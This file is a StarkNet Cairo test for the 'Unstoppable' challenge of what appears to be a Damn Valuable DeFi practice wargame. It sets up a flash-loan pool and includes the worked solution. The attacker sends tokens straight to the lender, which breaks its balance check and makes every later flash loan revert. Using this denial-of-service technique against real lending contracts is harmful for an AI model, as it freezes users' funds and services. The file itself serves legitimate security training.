%lang starknet

from starkware.cairo.common.cairo_builtins import HashBuiltin
from starkware.starknet.common.syscalls import get_caller_address
from starkware.cairo.common.uint256 import Uint256, assert_uint256_eq

from openzeppelin.token.erc20.IERC20 import IERC20

from src.unstoppable.interfaces.IUnstoppableLender import IUnstoppableLender
from src.unstoppable.interfaces.IReceiverUnstoppable import IReceiverUnstoppable
from src.DamnValuableToken import INITIAL_SUPPLY


// * -------------------------------------------------------------------------- * //
// *                               Initialization                               * //
// * -------------------------------------------------------------------------- * //

@view
func __setup__{syscall_ptr: felt*, range_check_ptr}() {
    alloc_locals;

    local contract_address: felt;
    local tokens_in_pool: Uint256 = Uint256(1000000, 0);
    local initial_attacker_token_balance: Uint256 = Uint256(100, 0);

    local DVT: felt;
    local UNSTOPPABLE_LENDER: felt;
    local RECEIVER_UNSTOPPABLE: felt;

    local deployer = 'starknet-deployer';
    local attacker = 'starknet-attacker';

    %{
        context.DVT = deploy_contract("src/DamnValuableToken.cairo", [ids.deployer]).contract_address
        context.UNSTOPPABLE_LENDER = deploy_contract("./src/unstoppable/UnstoppableLender.cairo", [context.DVT]).contract_address
        context.RECEIVER_UNSTOPPABLE = deploy_contract("./src/unstoppable/ReceiverUnstoppable.cairo", [context.UNSTOPPABLE_LENDER]).contract_address

        ids.DVT = context.DVT
        ids.UNSTOPPABLE_LENDER = context.UNSTOPPABLE_LENDER
        ids.RECEIVER_UNSTOPPABLE = context.RECEIVER_UNSTOPPABLE

        context.deployer = ids.deployer
        context.attacker = ids.attacker
    %}
    
    // Give approvals
    %{ stop_prank_callable = start_prank(ids.deployer, target_contract_address=ids.DVT) %}
    IERC20.approve(DVT, deployer, Uint256(INITIAL_SUPPLY, 0));
    IERC20.approve(DVT, UNSTOPPABLE_LENDER, tokens_in_pool);
    %{ stop_prank_callable() %}

    // Deposit tokens
    %{ stop_prank_callable = start_prank(ids.deployer, target_contract_address=ids.UNSTOPPABLE_LENDER) %}
    IUnstoppableLender.depositTokens(UNSTOPPABLE_LENDER, tokens_in_pool);
    %{ stop_prank_callable() %}

    // Transfer tokens to attacker
    %{ stop_prank_callable = start_prank(ids.deployer, target_contract_address=ids.DVT) %}
    IERC20.transfer(DVT, attacker, initial_attacker_token_balance);
    %{ stop_prank_callable() %}

    // Ensure balances are correct
    let (UNSTOPPABLE_LENDER_balance) = IERC20.balanceOf(DVT, UNSTOPPABLE_LENDER);
    let (attacker_balance) = IERC20.balanceOf(DVT, attacker);
    assert_uint256_eq(UNSTOPPABLE_LENDER_balance, tokens_in_pool);
    assert_uint256_eq(attacker_balance, initial_attacker_token_balance);

    // Show it's possible for some user to take out flash loan
    local some_user = 'starknet-some-user';

    let borrow_amount: Uint256 = Uint256(10, 0);

    %{ stop_prank_callable = start_prank(ids.some_user, ids.UNSTOPPABLE_LENDER) %}
    IUnstoppableLender.setReceiverAddress(UNSTOPPABLE_LENDER, RECEIVER_UNSTOPPABLE);
    IReceiverUnstoppable.executeFlashLoan(RECEIVER_UNSTOPPABLE, borrow_amount);
    %{ stop_prank_callable() %}

    return ();
}


// * -------------------------------------------------------------------------- * //
// *                                   Hacking                                  * //
// * -------------------------------------------------------------------------- * //

@external
func test_hack{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() {
    alloc_locals;

    local DVT: felt;
    local UNSTOPPABLE_LENDER: felt;
    local RECEIVER_UNSTOPPABLE: felt;

    local attacker: felt;

    local initial_attacker_token_balance: Uint256 = Uint256(100, 0);
    local borrow_amount: Uint256 = Uint256(10, 0);

    %{ 
        ids.DVT = context.DVT
        ids.UNSTOPPABLE_LENDER = context.UNSTOPPABLE_LENDER
        ids.RECEIVER_UNSTOPPABLE = context.RECEIVER_UNSTOPPABLE

        ids.attacker = context.attacker
    %}

    // * ---------------------------- Your code here... --------------------------- * //

    %{ stop_prank_callable = start_prank(ids.attacker, target_contract_address=ids.DVT) %}
    IERC20.transfer(DVT, UNSTOPPABLE_LENDER, initial_attacker_token_balance);
    %{ stop_prank_callable() %}

    // * -------------------------------- Checking -------------------------------- * //

    //It should be no longer possible to execute flash loans
    %{ expect_revert() %}
    IReceiverUnstoppable.executeFlashLoan(RECEIVER_UNSTOPPABLE, borrow_amount);

    %{ print("Unstoppable: Challenge Completed! ✨") %}

    return ();
}
